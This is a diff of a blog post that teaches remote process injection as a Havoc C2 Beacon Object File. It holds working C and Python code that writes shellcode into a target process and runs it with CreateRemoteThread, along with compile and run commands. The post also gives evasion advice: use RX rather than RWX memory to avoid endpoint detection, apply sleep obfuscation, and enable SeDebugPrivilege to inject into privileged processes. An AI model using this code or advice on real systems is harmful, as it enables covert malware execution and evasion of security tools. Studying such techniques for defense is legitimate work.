@@ -1,4 +1,3 @@
-### Under development
 [back to blog](../blog.md)
 
 ## Process Injection
@@ -9,7 +8,7 @@ This blog will outline a simple process injection in a remote process. The windo
 | [Openprocess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) | Will be used to open the handle of target process. 
 | [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) | Will be used for allocating memory in the target process, allocated memory size will depend on the shellcode size. 
 | [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) | Writes the shellcode in the allocated memory address.
-| [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex) | Will be used for changing the memory permission to read,execute (RX) instead or Read, Write, Execute (RWX).
+| [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex) | Will be used for changing the memory permission to read,execute (RX) instead of Read, Write, Execute (RWX).
 | [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) | Will be used for creating a thread on the target process inorder to execute our shellcode.
 | [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) | Close the open handle.
 
@@ -28,6 +27,7 @@ def run_procinj(demon_id, *args):
     packer: Packer = Packer() 
     # Get the beacon instance
     demon = Demon(demon_id)
+    binary: bytes = None
 
     if len(args) < 2:
         demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
@@ -51,14 +51,12 @@ def run_procinj(demon_id, *args):
 
     # Add the arguments to the packer
     packer.addbytes(binary)
-
-    # packs the userinput from C2 client
-    packer.addstr(args[1])
+    packer.addint(int(args[1]))
 
     task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked the demon to execute process injection on the process ID: {args[1]}")
    
     demon.InlineExecute(task_id, "go", "bin/test2.o", packer.getbuffer(), False)
-
+    #testbof procinj /home/kali/mdev/havocbof/demon.x64.bin 1992
     return task_id
 
 <SNIPPED>
@@ -103,51 +101,46 @@ void go(char* args, int argc){
     HANDLE pHandle;
     HANDLE rthreadHandle;
     PVOID bufferMemoryaddr;
+    DWORD tid = 0;
 
     //Beacon data parser
     BeaconDataParse(&parser, args, argc);
     
 
     shellcode = BeaconDataExtract(&parser, &shellcodeLength);
-    procid = BeaconDataExtract(&parser, NULL);
+    procid = BeaconDataInt(&parser);
 
     //prints hello world
-    BeaconPrintf(CALLBACK_OUTPUT, "[!] Target PID: %s", procid);
-    BeaconPrintf(CALLBACK_OUTPUT, "[!] Shellcode length: %s", &shellcodeLength);
-
-    
-
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] Target PID: %d", procid);
 
     pHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, procid);
     if (!pHandle){
         BeaconPrintf(CALLBACK_OUTPUT, "[x] Failed to open process error code: %d\n", KERNEL32$GetLastError());
-        return FALSE;
+        return 1; //failure
     }
 
-    bufferMemoryaddr = KERNEL32$VirtualAllocEx(pHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    if(!bufferMemoryaddr){
+    bufferMemoryaddr = KERNEL32$VirtualAllocEx(pHandle, NULL, shellcodeLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!bufferMemoryaddr) {
         BeaconPrintf(CALLBACK_OUTPUT,"[x] Failed to allocate memory: %d\n", KERNEL32$GetLastError());
-        return FALSE;
+        return 1;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[!] Allocated Memory At : 0x%p \n", bufferMemoryaddr);
+    BeaconPrintf(CALLBACK_OUTPUT,"[!] memory allocated at: 0x%p\n", bufferMemoryaddr);
 
     if (!KERNEL32$WriteProcessMemory(pHandle, bufferMemoryaddr, shellcode, shellcodeLength, &sNumberOfBytesWritten)) {
         BeaconPrintf(CALLBACK_OUTPUT,"[x] WriteProcessMemory Failed With Error : %d \n", KERNEL32$GetLastError());
-        return FALSE;
+        return 1;
+    }
+    if (!KERNEL32$VirtualProtectEx(pHandle, bufferMemoryaddr, shellcodeLength, PAGE_EXECUTE_READ, &dwOldProtection)) {
+        BeaconPrintf(CALLBACK_OUTPUT,"[x] VirtualProtectEx Failed With Error : %d \n", KERNEL32$GetLastError());
+        return 1;
     }
 
-    if (!KERNEL32$VirtualProtectEx(pHandle, bufferMemoryaddr, shellcodeLength, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
-        BeaconPrintf(CALLBACK_OUTPUT,"[x] KERNEL32$VirtualProtectEx Failed With Error : %d \n", KERNEL32$GetLastError());
-        return FALSE;
-    }
-
-    rthreadHandle = KERNEL32$CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferMemoryaddr, NULL, 0, NULL);
+    rthreadHandle = KERNEL32$CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferMemoryaddr, NULL, 0, &tid);
     if(!rthreadHandle){
         BeaconPrintf(CALLBACK_OUTPUT,"[x] Failed to create remote thread: %d\n", KERNEL32$GetLastError());
-        return FALSE;
+        return 1;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[!] remote thread memory At : 0x%p \n", rthreadHandle);
-
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] remote thread id : %lu \n", tid);
     KERNEL32$CloseHandle(pHandle);
 
 }
@@ -156,9 +149,34 @@ void go(char* args, int argc){
 ```bash
 x86_64-w64-mingw32-gcc -c src/procinj.c -w -o bin/test2.o 
 ```
+Get a shell, then execute the BOF. As shown from the screenshot below it shows the memory address that has been allocated on the target process and it's remote thread ID for debugging purpose.
+![alt text](img/image4.png)
+![alt text](img/image-1.png)
 
 
-Reference
+Just a little information on how to check what was written on the memory address you can use **x64dbg, attach to the target process then press ctrl + g, paste the memory address**. In this screenshot I change my payload to msfvenom calc bin so it can be easier to read. As shown we can see the signatured `FC 48 83` and then the calc.exe
+![alt text](img/image-2.png)
+
+My havoc payload that I used, performs a sleep obfuscation technique with WaitForSingleObjextEx. TL;DR: Sleep obfuscation **changes the memory protection from RW to RX, and then back to RW** [sleep obfuscation](https://dtsec.us/2023-04-24-Sleep/)
+
+To check what happens on sleep, use process hacker, check the target process and then go to the threads, locate the thread id. The screenshot below shows when it's on sleep. 
+![alt text](img/image22.png)
+
+The screenshot below shows when it's not on sleep. As observe it's using winHTTP library for the communication.
+![alt text](img/image5.png)
+
+If you are trying to perform a process injection on a process owned by other user or a process owned by NT authority and you dont have enough privilege. This wont be possible because of access control restrictions. But if you enable SeDebugPrivilege you will be able to injec.
+![alt text](img/image-3.png)
+
+
+I changed the VirtualAllocEx with page execute read write and comment out the VirtualProtectEx to see the difference and also without the sleep obfuscation from have. I used the metasploit calc here for POC.
+
+As shown from the screenshot below the RWX stands out and most endpoint security solution flags this and gets highly detected, so the better approach is to change it to RX. If you change it to Read it wont be executed. Clicking on the RWX this shows what was written on that memory and it shows the metasploit calc.
+![alt text](img/image6.png)
+
+References
 - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
+- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_dynamic-func-resolution.htm
+- https://dtsec.us/2023-04-24-Sleep
 
 [back to blog](../blog.md)
